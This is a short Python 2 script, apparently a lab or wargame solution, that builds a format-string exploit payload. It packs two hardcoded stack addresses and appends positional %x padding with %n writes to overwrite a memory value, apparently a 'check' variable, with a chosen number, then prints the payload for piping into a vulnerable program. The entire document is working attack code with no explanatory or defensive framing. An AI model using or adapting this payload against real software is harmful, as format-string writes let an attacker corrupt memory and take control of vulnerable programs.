import struct

check_addr1 = struct.pack("I", 0xbffffb28)
check_addr2 = struct.pack("I", 0xbffffb2a)
format_string = "%9$48871x" + "%9$n" + "%10$8126x" + "%10$n"

payload = check_addr1 + check_addr2 + format_string

print  payload